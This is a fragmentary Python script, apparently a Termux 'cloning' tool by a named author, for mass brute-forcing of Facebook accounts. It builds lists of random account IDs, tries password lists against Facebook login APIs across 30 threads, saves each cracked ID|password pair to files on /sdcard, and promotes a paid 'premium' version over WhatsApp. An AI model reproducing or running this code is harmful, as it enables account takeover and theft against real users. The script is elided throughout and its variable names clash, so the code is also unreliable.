#SOURCE BY : Ajmir__Hossain
#Enjoy All frinds paid to free

from os import path
import os,base64,zlib,pip,urllib
os.system('XD-open fb://group/1385458558859980?ref=share&mibextid=NSMWBT')
...
----------------------------------------------
 Github    : Ajmirhossain000
 Facebook  : Ajmir Hossain 
 Tool Name : Ajmir Hossain 
 Type type : NO PAID THIS FREE
 Version   : 1.0.0
----------------------------------------------
 Ajmir Pro version 1.0.0
 Dad Of All: Name Tho Suna Hoga Ajmir Dada
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if Malang in ['1','01']:
                                ...
                                os.system(f'XD-open https://chat.whatsapp.com/{wx}');menu()
                        elif Malang in ['7','07']:
                                os.system('XD-open https://mediafire.com/file/y1wvgc2zqqunxbn/Veero_VPN1.0.apk/file');menu()
                        elif Malang in ['8','08']:
                                os.system('XD-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif Malang in ['0','00']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923424080882&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Ajmir Sir, I Need To Buy Your Paid Ajmir PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python Ajmir.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Veero:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                Ajmir.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def bd():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Ajmir:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: Umar, ali, Salman, Ayan,Atc\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: Khan, Malik, ali,Atc \033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [VEERO-AFRIDI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Ajmir=session.cookies.get_dict().keys()
                        if "c_user" in Veero:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [VEERO-OK] %s | %s'%(ids,pas))
                                open('/sdcard/VEERO-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Ajmir:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [AJMIR-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AJMIR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [AJMIR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/VEERO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AJMIR-HOSSAIN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [AJMIR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AJMIR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AJMIR-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [AJMIR-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/AJMIR-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AJMIR-OK] '+uid+' | '+pas+'\033[1;97m')
